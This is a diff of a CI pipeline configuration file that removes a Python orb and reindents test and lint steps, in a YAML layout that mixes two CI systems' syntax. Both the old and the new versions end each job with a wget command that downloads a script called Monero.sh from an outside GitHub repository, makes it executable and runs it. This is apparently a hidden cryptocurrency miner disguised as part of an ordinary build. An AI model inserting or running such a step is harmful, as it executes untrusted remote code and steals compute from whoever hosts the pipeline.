@@ -1,29 +1,22 @@
 version: 2.1
 
-orbs:
-  # The python orb contains a set of prepackaged CircleCI configuration you can use repeatedly in your configuration files
-  # Orb commands and jobs help you with common scripting around a language/toolhttps://circleci.com/docs/2.0/configuration-reference/#workflows 
-  # so you dont have to copy and paste it everywhere.
-  # See the orb documentation here: https://circleci.com/developer/orbs/orb/circleci/python
-  python: circleci/python@1.2
-
 workflows:
     jobs:
-      pipelines:
+      - pipelines:
         default:
-          - parallel:
-            - step:
-              name: A
-              caches:
-                - pip
-              script:
-                - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
-                - pip install pytest
-                - pytest -v tests/* --junitxml=test-reports/report.xml
-                - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
-            - step:
-              name: B
-              script:
-                - pip install flake8
-                - flake8 . --extend-exclude=dist,build --show-source --statistics
-                - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+        - parallel:
+          - step:
+            name: A
+            caches:
+              - pip
+            script:
+              - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+              - pip install pytest
+              - pytest -v tests/* --junitxml=test-reports/report.xml
+              - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+          - step:
+            name: B
+            script:
+              - pip install flake8
+              - flake8 . --extend-exclude=dist,build --show-source --statistics
+              - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
